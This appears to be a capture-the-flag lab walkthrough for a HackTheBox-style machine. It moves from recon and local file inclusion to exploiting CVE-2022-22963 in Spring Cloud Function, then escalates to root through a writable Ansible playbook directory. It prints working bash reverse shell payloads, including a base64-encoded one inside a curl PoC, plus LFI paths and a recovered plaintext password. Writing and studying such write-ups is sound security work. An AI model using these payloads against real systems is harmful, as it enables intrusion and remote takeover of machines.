# Recon
```
 nmap -p- --min-rate 10000 10.10.11.204      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 03:57 EEST
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 79.78% done; ETC: 03:57 (0:00:07 remaining)
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 80.07% done; ETC: 03:57 (0:00:06 remaining)
Nmap scan report for 10.10.11.204
Host is up (0.088s latency).
Not shown: 65327 filtered tcp ports (no-response), 206 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 33.18 seconds
```
- Upon browsing to port 8080 , we see the webpage
- Let us explore the endpoints listed in the page's top navigation bar
- The "Upload" functionality at /upload seems interesting as it has the option to upload a file
- When we try to upload a random .txt file, the page throws an error saying that only image files are allowed
- Upon successfully uploading an image file, we are provided with the option to view the uploaded image
- The "View your image" hyperlink takes us to the /show_image endpoint, which appends an img query parameter to the URL , whose value is the name of the uploaded image file
- the application reads the value of the img parameter in the URL and includes the corresponding file on the server
- if the application is not properly sanitizing the img parameter, we could craft a malicious request that includes a file outside of the intended directory- this is known as a Local File Inclusion (could include the /etc/passwd file on the remote host)
- intercept the HTTP request to the /show_image endpoint using the BurpSuite proxy, send the intercepted request to Repeater by pressing Ctrl+R and send the LFI payload in the img parameter to try to read the /etc/passwd file
- We can successfully read the contents of the /etc/passwd file in the HTTP response, thus verifying the presence of the LFI vulnerability in the web app.
- specifying the path of the /var/www/ directory, which is commonly used by web applications, we can reveal potential sub-directories
- ```
  ../../../../../../var/www
  ```
- By carefully examining the /var/www/WebApp/pom.xml file, we find that the web app is using version 3.2.2 of the Spring-Cloud-Function-Web module
- quick search about available exploits for that specific version reveals that it is vulnerable to Remote Code Execution ( RCE ), addressed in CVE-2022-22963
- to trigger the Remote Code Execution ( RCE ), we need to send a malicious POST request to the /functionRouter endpoint of the web app
-  First, we generate a Base64 -encoded Bash reverse shell payload using the following command
-  ```
   echo -n "bash -i >& /dev/tcp/10.10.16.5/1337 0>&1" | base64
   ```
- The POST request must include the following HTTP header. We paste the generated payload into the exec() function and pipe it into bash
```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash
-c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzEzMzcgMD4mMQ==}|{base64,-d}|{bash,-
i}")
```
- i couldnt get ashell from above so i used metasploit and fond the exploit but also couldnt get ashell
- after some search found this poc
```
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzEzMzcgMD4mMQ==}|{base64,-d}|bash")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```
- and we got ashell as frank
- The shell can be upgraded to a TTY shell using the following commands
```
script /dev/null -c bash
export TERM=xterm
# Control + z
stty raw -echo && fg
# Press Enter (Return) twice
```
- after searching frank system we found this
```
cat /home/frank/.m2/settings.xml
```
- phil password ** DocPhillovestoInject123 **
- now switch to phill
- we found the user flag on phill home
# Privilege Escalation
- the pspy utility. We can download the pspy binary on the remote host by hosting it on our local machine using a Python HTTP server
- After letting the pspy binary run for a few minutes, we can see the following processes running as root show up every 2 minutes indicating that they are likely being run as a cronjob
- Google search reveals that ansible-parallel is a Python package that is used to execute multiple Ansible playbooks in parallel
- The /usr/local/bin/ansible-parallel binary is operating with root privileges , as indicated by the UID=0 , and executes all *.yml files found in the
/opt/automation/tasks directory, which are most likely the Ansible playbook files
- Another cronjob removes all the files from the /opt/automation/tasks directory and then copies the file /root/playbook_1.yml to /opt/automation/tasks/
- This command is likely used to replace the contents of the /opt/automation/tasks/ directory with a single file called playbook_1.yml
-  ```
   cat /opt/automation/tasks/playbook_1.yml
   ```
- This playbook is designed to check if the webapp service is running on the local machine, and if not, to start and configure it to start automatically at boot time
- check the permissions on the /opt/automation/tasks/ directory, we find that only the user root and the user group staff have read and write access
- the user phil is a member of the user group staff
- Knowing that the cronjob executes any and all .yml files inside the directory with root permissions, we can create a malicious Ansible playbook YAML file containing a task that will execute our payload, allowing us to escalate our privileges
- We create a new file called playbook_2.yml on the remote host in the /opt/automation/tasks directory
- the YAML playbook will consist of a single task that runs a shell command on the localhost host
- The shell command is a Bash reverse shell payload that will attempt to connect back to our machine
```
- hosts: localhost
  tasks:
  - name: Checking webapp service
    shell:
      cmd: bash -c 'bash -i >& /dev/tcp/10.10.16.5/1233 0>&1'
```
- After two minutes, when the cronjob executes, we successfully get a reverse shell as root
- 
